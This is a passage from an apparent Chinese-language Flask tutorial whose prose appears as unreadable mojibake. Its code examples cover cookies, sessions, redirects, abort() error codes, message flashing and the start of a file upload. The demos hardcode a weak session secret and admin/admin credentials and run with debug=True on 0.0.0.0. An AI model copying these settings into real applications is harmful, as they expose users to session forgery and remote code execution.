operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.0.102:5000/setcookie<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>Enter userID<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>nm<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>submit<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Login<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>readcookie.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span>  <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.0.102:5000/getcookie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Click here to read cookie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>é¦–å…ˆåœ¨è®¿é—®<code>http://127.0.0.1:5000/</code>ä¼ å…¥flaskï¼Œç‚¹å‡»Click here to read cookieå³å¯çœ‹åˆ°<code>welcome &#39;flask&#39;</code></p><h2 id="ä¼šè¯"><a href="#ä¼šè¯" class="headerlink" title="ä¼šè¯"></a>ä¼šè¯</h2><p>sessionæ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šçš„ï¼Œä¼šè¯æ˜¯å®¢æˆ·ç«¯ç™»å½•åˆ°æœåŠ¡å™¨å¹¶æ³¨é”€æœåŠ¡å™¨çš„æ—¶é—´é—´éš”ã€‚éœ€è¦åœ¨è¯¥ä¼šè¯ä¸­ä¿å­˜çš„æ•°æ®ä¼šå­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šçš„ä¸´æ—¶ç›®å½•ä¸­ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:UTF-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'any random string'</span><span class="token comment">#app.secret_key = os.urandom(12)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string">'Logged in as '</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">'&lt;br>'</span> <span class="token operator">+</span> <span class="token string">"&lt;b>&lt;a href = '/logout'>click here to log out&lt;/a>&lt;/b>"</span>    <span class="token keyword">return</span> <span class="token string">"You are not logged in &lt;br>&lt;a href = '/login'>&lt;/b>"</span> <span class="token operator">+</span> <span class="token string">"click here to log in&lt;/b>&lt;/a>"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''   &lt;form action = "" method = "post">      &lt;p>&lt;input type = text name = username />&lt;/p>      &lt;p>&lt;input type = submit value = Login />&lt;/p>   &lt;/form>   '''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>è¿™é‡Œå°†session_keyè®¾ç½®æˆäº†any random string</p><h2 id="é‡å®šå‘å’Œé”™è¯¯"><a href="#é‡å®šå‘å’Œé”™è¯¯" class="headerlink" title="é‡å®šå‘å’Œé”™è¯¯"></a>é‡å®šå‘å’Œé”™è¯¯</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:UTF-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/success'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'logged in successfully'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>å½“ç”¨æˆ·è¾“å…¥ä¸ä¸ºadminæ—¶åˆ™ç›´æ¥302é‡å®šå‘åˆ°loginç•Œé¢</p><p>login.html</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>html<span class="token operator">></span>   <span class="token operator">&lt;</span>body<span class="token operator">></span>      <span class="token operator">&lt;</span>form action <span class="token operator">=</span> <span class="token string">"http://192.168.0.102:5000/login"</span> method <span class="token operator">=</span> <span class="token string">"post"</span><span class="token operator">></span>         <span class="token operator">&lt;</span>p<span class="token operator">></span>Enter Name<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>         <span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token operator">&lt;</span><span class="token builtin">input</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">"text"</span> name <span class="token operator">=</span> <span class="token string">"username"</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>         <span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token operator">&lt;</span><span class="token builtin">input</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">"submit"</span> value <span class="token operator">=</span> <span class="token string">"submit"</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>   <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre><p>æŠ¥é”™ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:UTF-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session<span class="token punctuation">,</span>abort<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            abort<span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/success'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'logged in successfully'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p><code>Flask.abort(code)</code>ï¼šå¸¦æœ‰é”™è¯¯ä»£ç çš„abortå‡½æ•°</p><ul><li><strong>400</strong> - ç”¨äºé”™è¯¯è¯·æ±‚</li><li><strong>401</strong> - ç”¨äºæœªèº«ä»½éªŒè¯çš„</li><li><strong>403</strong> - Forbidden</li><li><strong>404</strong> - æœªä¸åˆ°</li><li><strong>406</strong> - è¡¨ç¤ºä¸æ¥å—</li><li><strong>415</strong> - ç”¨äºä¸æ”¯æŒçš„åª’ä½“ç±»å‹</li><li><strong>429</strong> - è¯·æ±‚è¿‡å¤š</li></ul><p>è‹¥ç™»å½•ä¸æ˜¯adminåˆ™æŠ¥401ï¼š<code>Unauthorized</code>é”™è¯¯</p><h2 id="æ¶ˆæ¯é—ªç°"><a href="#æ¶ˆæ¯é—ªç°" class="headerlink" title="æ¶ˆæ¯é—ªç°"></a>æ¶ˆæ¯é—ªç°</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:UTF-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session<span class="token punctuation">,</span>abort<span class="token punctuation">,</span>flash<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    error <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'admin'</span> <span class="token keyword">or</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>            error <span class="token operator">=</span> <span class="token string">'Invalid username or password. Please try again!'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'You were successfully logged in'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> error <span class="token operator">=</span> error<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p><code>flash(message, category)</code>ï¼šå°†æ¶ˆæ¯ä¼ é€’ç»™ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œè¯¥è¯·æ±‚é€šå¸¸æ˜¯ä¸€ä¸ªæ¨¡æ¿ã€‚</p><ul><li><strong>message</strong>ï¼šå‚æ•°æ˜¯è¦é—ªç°çš„å®é™…æ¶ˆæ¯ã€‚</li><li><strong>category</strong>ï¼šå‚æ•°æ˜¯å¯é€‰çš„ã€‚å®ƒå¯ä»¥æ˜¯â€œerrorâ€ï¼Œâ€œinfoâ€æˆ–â€œwarningâ€ã€‚</li></ul><p><code>get_flashed_messages(with_categories, category_filter)</code>ï¼šä»ä¼šè¯ä¸­åˆ é™¤æ¶ˆæ¯</p><p>ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯å¯é€‰çš„ã€‚å¦‚æœæ¥æ”¶åˆ°çš„æ¶ˆæ¯å…·æœ‰ç±»åˆ«ï¼Œåˆ™ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å…ƒç»„ã€‚ç¬¬äºŒä¸ªå‚æ•°ä»…ç”¨äºæ˜¾ç¤ºç‰¹å®šæ¶ˆæ¯ã€‚ç¬¬ä¸€ä¸ªé»˜è®¤ä¸ºFalse</p><p>å…¸å‹çš„æ¶ˆæ¯é—ªç°æ¨¡æ¿ï¼š</p><pre class="language-html" data-language="html"><code class="language-html">&#123;% with messages = get_flashed_messages() %&#125;   &#123;% if messages %&#125;      &#123;% for message in messages %&#125;         &#123;&#123;  message &#125;&#125;      &#123;% endfor %&#125;   &#123;% endif %&#125;&#123;% endwith %&#125;</code></pre><p>ä¸‹é¢ç»™å‡ºhtmlä»£ç ï¼š</p><p>index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>&#123;% with messages = get_flashed_messages() %&#125;    &#123;% if messages %&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          &#123;% for message in messages %&#125;          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>&#123; &#123;  message &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          &#123;% endfor %&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    &#123;% endif %&#125; &#123;% endwith %&#125; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Flask Message Flashing Example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Do you want to <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>&#123;&#123;  url_for(<span class="token punctuation">'</span>login<span class="token punctuation">'</span>) &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>log in?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>login.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>   &#123;% if error %&#125;   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>Error:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span> &#123;&#123;  error &#125;&#125;   &#123;% endif %&#125;   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> post</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> text</span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> username</span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>&#123;&#123; request.form.username &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> password</span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> submit</span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> Login</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>è®¿é—®<code>http://127.0.0.1:5000/</code>ç‚¹å‡»loginåè¿›å…¥ç™»å½•ç•Œé¢ï¼Œéšåå¦‚æœè¾“å…¥çš„usernameå’Œpasswordä¸æ˜¯adminçš„è¯ä¼šåœ¨ç•Œé¢ä¸Šæ˜¾ç¤ºerroræ¶ˆæ¯ï¼Œè‹¥ç™»å½•æˆåŠŸåˆ™è·³è½¬åˆ°indexé¡µé¢ä¸Šæ–¹æ˜¾ç¤ºç™»å½•æˆåŠŸæ¶ˆæ¯</p><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><p>upload.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Upload new File<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>&#123;% with messages = get_flashed_messages() %&#125;    &#123;% if messages %&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          &#123;% for message in messages %&#125;          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>&#123;&#123;  message &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>          &#123;% endfor %&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    &#123;% endif %&#125; &#123;% endwith %&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Upload new File<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>post</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>multipart/form-data</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>file</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation 